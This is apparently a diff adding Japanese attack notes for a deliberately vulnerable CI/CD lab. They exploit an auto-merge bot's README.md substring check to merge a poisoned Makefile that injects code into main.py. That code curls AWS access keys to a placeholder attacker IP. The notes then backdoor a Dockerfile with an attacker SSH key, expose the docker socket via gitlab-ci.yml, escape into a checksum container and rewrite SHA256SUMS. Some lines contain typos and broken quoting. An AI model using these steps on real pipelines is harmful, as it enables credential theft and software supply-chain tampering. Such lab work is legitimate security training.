@@ -1,0 +1,69 @@
+4-1
+zeijaku-app-auto-merge-bot.shを見る。
+３０行目　if文で「[[=～]]」による拡張表現を用いた部分文字列比較、$OLD_PATHに文字列「README.md」が含まれていれば、自動マージを行うバグがある。
+README.mdの変更とまとめてマージリクエストを作成すれば、README.mdの変更以外のコミットも自動マージさせることが可能
+
+makefileのbuildのターゲットをmain.pyに不正コードを注入するように改ざんするI-PPE攻撃
+READMEを変更して、コミットする。
+まとめてマージリクエストするために、「この変更で新しいマージリクエストを開始」のチェックを外す。
+
+makefileの６－８行目に下記のコードを追加
+echo "import os" > ./src/zeijakuapp/main.py
+echo "def zeijaku():" >> ./src/zeijakuapp/main.py
+echo "  os.system('curl -X POST <攻撃用IP> -d \" + str(os.environ['AWS_ACCESS_KEY_ID'])+':'+os.environ['AWS_SECRET_ACCESS_KEY'])+'\")" >> ./src/zeijakuapp/main.py
+
+
+マージのリクエストを作成
+ターゲットのブランチはmainブランチ
+READMEラベルを付ける
+
+nc -l -p 80
+
+
+4-2
+Dockerfileの改ざん
+id_rsa.pubについては、攻撃用VMで以下を実行しSSH鍵ペアを作成
+ssh-keygen -t rsa -C ""
+
+FROM docker:24.0.6
+
+COPY ./notify.py/
+
+RUN spk add openssh-server
+RUN ssh-keygen -A
+RUN mkdir /root/.ssh && chmod 700 /root/.ssh/
+RUN echo '<id_rsa.pubの中身>'\>/root/.ssh/authorized_keys && chmod 600 /root/.ssh/authorized_keys
+
+ENTRYPOINT["/usr/sbin/sshd","-D"]
+
+
+
+
+
+gitlab-ci.ymlの改ざん
+-"docker run -dit --restart=always -p 10022:22 --net=zeijaku-network -v /var/run/docker.sock --name $NAME ${URL}${PROJ}:latest"
+
+攻撃VMで以下を実行
+ssh -i ./id_rsa -p 10022 root@checksum-server.example.com
+
+
+コンテナエスケープして、チェックサム公開コンテナに入り、SHA256SUMSを書き換える
+docker ps 開発環境サーバ上で動作するコンテナを確認
+docker exec -it zeijaku-checksum-server /bin/bash
+./htdocs/配下にSHA256SUMSがあるので自由に書き換える。
+echo "attack" >> ./htdocs/SHA256SUMS
+
+パッケージは左サイドバーのビルド＞ジョブをクリックし、↓ボタンからダウンロード
+ダウンロードしたartifict.zipを展開し、sha256sumコマンドでチェックサムを計算
+echo "計算した値" >> ./htdocs/SHA256SUMS
+
+
+
+
+
+
+
+
+
+
+
